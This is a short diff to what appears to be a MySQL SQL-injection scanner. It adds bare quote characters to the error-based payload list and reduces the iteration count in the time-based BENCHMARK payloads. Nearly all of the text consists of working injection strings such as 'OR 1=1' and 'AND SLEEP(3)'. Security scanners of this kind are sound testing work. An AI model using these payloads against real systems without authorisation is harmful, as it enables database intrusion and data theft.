@@ -30,6 +30,8 @@ MYSQL_ERROR_PATTERNS = [
 # MySQL error-based payloads
 MYSQL_ERROR_PAYLOADS = [
     # Standard error-based payloads
+    "'",
+    "\"",
     "' OR 1=1 -- -",
     "\" OR 1=1 -- -",
     "' OR '1'='1",
@@ -70,8 +72,8 @@ MYSQL_BOOLEAN_PAYLOADS = [
 MYSQL_TIME_PAYLOADS = [
     "' AND SLEEP(3) -- -",
     "\" AND SLEEP(3) -- -",
-    "' AND BENCHMARK(30000000,MD5(1)) -- -",
-    "\" AND BENCHMARK(30000000,MD5(1)) -- -",
+    "' AND BENCHMARK(20,MD5(1)) -- -",
+    "\" AND BENCHMARK(20,MD5(1)) -- -",
     "') AND SLEEP(3) -- -",
     "\") AND SLEEP(3) -- -",
     "' OR SLEEP(3) -- -",
